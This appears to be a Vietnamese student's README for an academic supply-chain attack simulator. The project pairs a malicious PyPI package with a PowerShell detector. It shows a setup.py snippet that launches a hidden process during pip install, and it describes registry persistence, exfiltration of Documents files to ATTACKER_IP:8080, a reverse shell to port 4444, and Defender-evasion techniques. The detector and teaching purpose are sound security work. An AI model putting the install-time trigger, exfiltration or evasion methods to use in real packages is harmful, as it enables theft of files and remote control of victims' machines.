# 🐍 Supply Chain Attack Simulator & EDR Monitor

<div align="center">

![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![Platform](https://img.shields.io/badge/Attacker-Ubuntu%2024.04-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Platform](https://img.shields.io/badge/Victim-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-T1195-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Academic%20PoC-yellow?style=for-the-badge)

**Đồ án môn An toàn Thông tin — Đại học Công nghệ Thông tin (UIT), ĐHQG TP.HCM**

[📋 Tổng quan](#-tổng-quan) • [🏗️ Kiến trúc](#️-kiến-trúc-hệ-thống) • [🚀 Triển khai Lab](#-hướng-dẫn-triển-khai-lab) • [📊 Kết quả](#-kết-quả-thực-nghiệm) • [🔵 Detector](#-detector-edr)

</div>

---

> **⚠️ TUYÊN BỐ TRÁCH NHIỆM PHÁP LÝ**
>
> Dự án này được phát triển **hoàn toàn vì mục đích học thuật và giáo dục** trong khuôn khổ Đồ án môn An toàn Thông tin tại UIT - ĐHQG TP.HCM. Toàn bộ thực nghiệm được thực hiện trong môi trường máy ảo VMware, mạng **host-only cô lập, không kết nối internet thật**. **Tuyệt đối không sử dụng các kịch bản này bên ngoài môi trường Lab được cấp phép.**

---

## 📋 Tổng quan

Dự án là một **Proof of Concept (PoC)** minh họa toàn bộ vòng đời của kịch bản **Tấn công Chuỗi Cung Ứng Phần Mềm** (Supply Chain Compromise — MITRE ATT&CK **T1195**), bao gồm cả phần tấn công (Red Team) và phòng thủ (Blue Team).

Lấy cảm hứng từ các sự kiện thực tế như **SolarWinds 2020** và **XZ Utils backdoor 2024**, PoC này chứng minh rằng kẻ tấn công không cần phá vỡ hệ thống phòng thủ trực tiếp — chỉ cần đặt mã độc vào đúng điểm mà nạn nhân tin tưởng: **package dependency**.

### Điểm nổi bật

| Hạng mục | Chi tiết |
|---|---|
| 🎯 **Kỹ thuật tấn công** | Module-level execution tại `setup.py` — kích hoạt ngay khi `pip install` đọc metadata, vượt qua PEP 517 sandbox |
| 🦠 **Payload** | Persistence (T1547.001) + True Exfiltration (T1041) + Reverse Shell (T1059.001) |
| 🥷 **Evasion** | Living off the Land — chạy dưới `python.exe` hợp pháp, không drop `.exe`, không trigger AMSI |
| 🛡️ **Bypass kết quả** | Windows Defender Full Scan (809,085 files, 48 phút) — **không phát hiện** |
| 🔵 **Phòng thủ** | PowerShell Behavioral Detector — giám sát TCP outbound realtime, có whitelist & audit log |

---

## 🏗️ Kiến trúc Hệ thống

```
supply-chain-attack-simulator/
│
├── 🔴 red_team/                        # Hạ tầng tấn công (Ubuntu 24.04)
│   ├── infrastructure/
│   │   ├── c2_server.py                # HTTP server nhận dữ liệu exfiltration (port 8080)
│   │   └── welcome.html                # Trang chào tùy chỉnh cho pypiserver
│   │
│   └── malicious_package/              # Gói thư viện độc hại
│       ├── setup.py                    #  Module-level trigger — kích hoạt khi pip đọc metadata
│       ├── README.md
│       └── safe_demo_pkg/
│           ├── __init__.py             # Entry point, gọi run_marker()
│           └── marker.py               #  Core payload: Persistence + Exfil + Shell
│
├── 🔵 blue_team/                       # Công cụ phòng thủ (Windows 10)
│   └── detector.ps1                    # PowerShell Behavioral Detector
│
├── docs/
│   └── S04_Report.docx                 # Báo cáo đầy đủ
│
├── requirements.txt
└── README.md
```

### Sơ đồ luồng tấn công

```
[Ubuntu - Attacker]                         [Windows 10 - Victim]
      │                                              │
      │  1. Build safe-demo-pkg-1.2.tar.gz           │
      │  2. Host trên pypiserver (port 8000)         │
      │  3. Mở nc listener (port 4444)     ─────────▶│  pip install safe-demo-pkg
      │  4. Mở c2_server.py (port 8080)              │      │
      │                                              │      ▼
      │                                              │  setup.py đọc metadata
      │                                              │      │ module-level execution
      │                                              │      ▼
      │                                              │  growl() spawn tiến trình ẩn
      │                                              │  (DETACHED + NO_WINDOW)
      │                                              │      │
      │◀─────────────── HTTP POST /exfil ────────────│  true_exfiltrate() → T1041
      │◀─────────────── TCP :4444 (shell) ───────────│  reverse_shell()   → T1059
      │                                              │  persist_registry() → T1547
      │                                              │
      ▼                                              ▼
[Nhận dữ liệu exfil]                    [pip hoàn tất bình thường]
[Có interactive shell]                  [Victim không hay biết gì]
```

---

## 🔴 Chi tiết Red Team

### Cơ chế kích hoạt — Module-level Execution

Kỹ thuật cốt lõi: khi `pip install` cần đọc metadata của package (tên, version...), nó **import** `setup.py`. Việc import này thực thi code ở cấp module ngay lập tức — trước cả khi package được cài vào `site-packages`.

```python
# setup.py (đơn giản hóa)
import subprocess, sys

#  Đây là module-level code — chạy ngay khi pip import file này
def growl():
    payload_cmd = f'"{sys.executable}" -c "from safe_demo_pkg.marker import run_marker; run_marker()"'
    subprocess.Popen(
        payload_cmd,
        creationflags=0x00000008 | 0x08000000,  # DETACHED_PROCESS | CREATE_NO_WINDOW
        start_new_session=True
    )

growl()  # Kích hoạt ngay khi pip đọc metadata
```

### Payload — `marker.py`

#### 1. `persist_registry()` — Persistence (T1547.001)

Ghi Registry key vào `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` để tự khởi động sau reboot.

- **Tại sao HKCU?** Không cần quyền Administrator, ít bị EDR giám sát hơn HKLM, key có tên ngụy trang `WindowsSysUpdater`

#### 2. `true_exfiltrate()` — True Exfiltration (T1041)

Quét `~/Documents` tìm file `.txt`, `.env`, `config.txt` → đọc nội dung → gửi HTTP POST về `ATTACKER_IP:8080`.

| Hành vi | Phiên bản cũ (v1.0) | Phiên bản mới (v1.2) |
|---|---|---|
| **Loại** | Local Staging — T1074 | True Exfiltration — T1041 |
| **Kết quả** | Copy file sang `C:\Temp\Loot` (vẫn trên máy victim) | Dữ liệu gửi qua mạng về C2 server |
| **Attacker phải làm gì?** | Dùng shell gõ thêm lệnh `type` để đọc | Không cần làm gì — dữ liệu tự đến |

#### 3. `reverse_shell()` — Backdoor C2 (T1059.001)

Kết nối **outbound** TCP về `ATTACKER_IP:4444`, tạo interactive shell. Tự reconnect sau 10 giây nếu bị ngắt.

---

## 🔵 Detector EDR

**`blue_team/detector.ps1`** — PowerShell script chạy với quyền Administrator, giám sát realtime các kết nối TCP outbound từ tiến trình Python.

### Tính năng chính

-  **Phát hiện** mọi kết nối `python.exe` ra IP ngoài whitelist
-  **Whitelist** thông minh: loại trừ PyPI CDN (Fastly `151.101.x.x`), localhost
-  **Chống spam**: mỗi kết nối chỉ cảnh báo 1 lần (`$ReportedConnections`)
-  **Audit log** ghi ra `C:\S04Demo\detector_audit.log` với timestamp
-  **"System Clear"** chỉ in 1 lần sau khi threat biến mất

### Demo phát hiện thực tế

```
--- S04 ADVANCED BEHAVIORAL DETECTOR IS RUNNING ---
[08:31:05] ALERT: Suspicious Python Outbound!
[!] PID: 8164 | Path: C:\Users\...\python.exe | Remote: 192.168.157.134
[08:35:22] System Clear: No active threats detected.
```

### Giới hạn đã biết

| Hạn chế | Hướng cải tiến |
|---|---|
| Polling 3 giây = detection gap | Dùng ETW hoặc WMI event-driven thay polling |
| Dễ bypass nếu đổi tên binary | Kiểm tra thêm đường dẫn và chữ ký số |
| False positive với Python hợp lệ | Mở rộng whitelist, dùng DNS-based filtering |
| Cần quyền Administrator | Ghi rõ trong deployment guide |

---

##  Hướng dẫn Triển khai Lab

> **Yêu cầu:** VMware với 2 VM, cấu hình mạng **host-only**. VM1: Ubuntu 24.04 LTS. VM2: Windows 10.

### Bước 1 — Môi trường Attacker (Ubuntu 24.04)

```bash
# Cài đặt dependencies
sudo apt install -y python3-venv
python3 -m venv myenv && source myenv/bin/activate
pip install -r requirements.txt

# Terminal 1: Khởi động C2 server (nhận exfiltration)
python3 red_team/infrastructure/c2_server.py

# Terminal 2: Mở Reverse Shell listener
nc -lvnp 4444

# Terminal 3: Build package và khởi động Private Registry
cd red_team/malicious_package
python3 -m build --sdist
pypi-server run -p 8000 ./dist --welcome ../infrastructure/welcome.html
```

### Bước 2 — Môi trường Victim (Windows 10)

```powershell
# Mô phỏng cài đặt nhầm package từ registry nội bộ bị xâm nhập
pip install safe-demo-pkg `
    --index-url http://<ATTACKER_IP>:8000/simple/ `
    --trusted-host <ATTACKER_IP>
```

Ngay sau khi lệnh hoàn tất, attacker sẽ thấy:
- **Terminal 1 (C2):** Nội dung file từ `Documents` của victim xuất hiện tự động
- **Terminal 2 (nc):** Prompt `Shell>` — có thể thực thi lệnh trên máy victim

### Bước 3 — Chạy Detector (Windows 10, PowerShell Admin)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
.\blue_team\detector.ps1
```

---

## 📊 Kết quả Thực nghiệm

### Bypass Windows Defender

| Thành phần | Phiên bản |
|---|---|
| Hệ điều hành | Windows 10 Enterprise LTSC 21H2 (Build 19044.7184) |
| Windows Defender | Antimalware Client v4.18.26030.3011 |
| Security Intelligence | Antivirus v1.449.166.0 |
| Loại scan | **Full Scan** — 809,085 files, 48 phút 21 giây |
| **Kết quả** |  **Không phát hiện mối đe dọa nào** |

### Tại sao bypass được — 5 lớp evasion

| Kỹ thuật | Cơ chế | Loại |
|---|---|---|
| **Trusted Process (python.exe)** | AV tin tưởng interpreter hợp pháp | Tự nhiên (LotL) |
| **Không có binary dropper** | Không tạo `.exe` mới → không trigger file scan | Tự nhiên |
| **Module-level execution** | Payload chạy trong context import pip | Thiết kế |
| **DETACHED + NO_WINDOW** | Tiến trình ẩn hoàn toàn, thoát khỏi pip parent | Chủ động |
| **Không dùng AMSI-hooked API** | `subprocess.Popen` → Win32 `CreateProcess` trực tiếp, AMSI không scan | Thiết kế |

### Vòng đời Incident Response

```
1. Detector phát hiện python.exe (PID 8164) → 192.168.157.134:4444 [ALERT]
2. pip uninstall safe-demo-pkg          ←  KHÔNG đủ! Tiến trình vẫn sống
3. taskkill /PID 8164 /F                ←  Kill tiến trình thực sự
4. Detector: "System Clear"             ← Xác nhận sạch
⚠️  Exfiltration đã hoàn tất — dữ liệu trên C2 không thể thu hồi
```

---

## 📚 Tài liệu tham khảo

- [MITRE ATT&CK T1195 — Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)
- [MITRE ATT&CK T1547.001 — Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [MITRE ATT&CK T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [MITRE ATT&CK T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [PEP 517 — A build-system independent format for source trees](https://peps.python.org/pep-0517/)
- [pypiserver — Minimal PyPI server](https://github.com/pypiserver/pypiserver)

---

## 👨‍💻 Tác giả

**Trần Hồng Quân**
Sinh viên Đại học Công nghệ Thông tin (UIT) — ĐHQG TP.HCM
Chuyên ngành: An toàn Thông tin

---

<div align="center">
<sub>Dự án này được tạo ra cho mục đích giáo dục. Hãy sử dụng kiến thức một cách có trách nhiệm.</sub>
</div>
